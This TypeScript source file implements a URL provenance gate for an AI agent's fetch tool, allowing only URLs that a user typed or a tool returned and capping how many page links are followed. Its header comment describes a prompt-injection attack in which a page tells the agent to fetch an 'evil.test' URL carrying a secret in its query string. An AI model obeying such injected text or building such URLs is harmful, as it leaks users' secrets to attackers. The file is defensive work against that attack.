/**
 * URL provenance gate. A model-chosen fetch is an exfiltration channel: an
 * injected page can ask the agent to fetch https://evil.test/?q=<secret>.
 * The gate allows only URLs a human typed or a tool returned, matched on the
 * normalized URL including its query string, so a model cannot compose one.
 */
import { extractUrls, normalizeUrl } from "./normalize.ts";
import type { SourceLedger } from "./ledger.ts";

export type Provenance = "user" | "ledger" | "page-link";

export type ProvenanceVerdict = { ok: true; via: Provenance } | { ok: false; reason: string };

export class UrlProvenance {
	private readonly user = new Set<string>();
	private readonly pageLinks = new Set<string>();
	private pageLinkFetches = 0;

	/** Record URLs in a message the human typed. */
	noteUserText(text: string): void {
		for (const url of extractUrls(text)) this.user.add(normalizeUrl(url));
	}

	/** Record links found in extracted page text; they are tool-returned but low trust. */
	notePageText(text: string): void {
		for (const url of extractUrls(text)) this.pageLinks.add(normalizeUrl(url));
	}

	/** A new human turn resets the cap on page-link fetches. */
	newTurn(): void {
		this.pageLinkFetches = 0;
	}

	check(url: string, ledger: SourceLedger, options: { maxPageLinkFetches: number; allowUnlisted?: boolean }): ProvenanceVerdict {
		const key = normalizeUrl(url);
		if (this.user.has(key)) return { ok: true, via: "user" };
		if (ledger.source(url)) return { ok: true, via: "ledger" };
		if (this.pageLinks.has(key)) {
			if (this.pageLinkFetches >= options.maxPageLinkFetches) {
				return { ok: false, reason: `page-link fetch cap reached (${options.maxPageLinkFetches} per user turn)` };
			}
			this.pageLinkFetches += 1;
			return { ok: true, via: "page-link" };
		}
		if (options.allowUnlisted) return { ok: true, via: "user" };
		return {
			ok: false,
			reason: "URL was not typed by the user or returned by a search or extraction; search for it or ask the user to supply it",
		};
	}
}
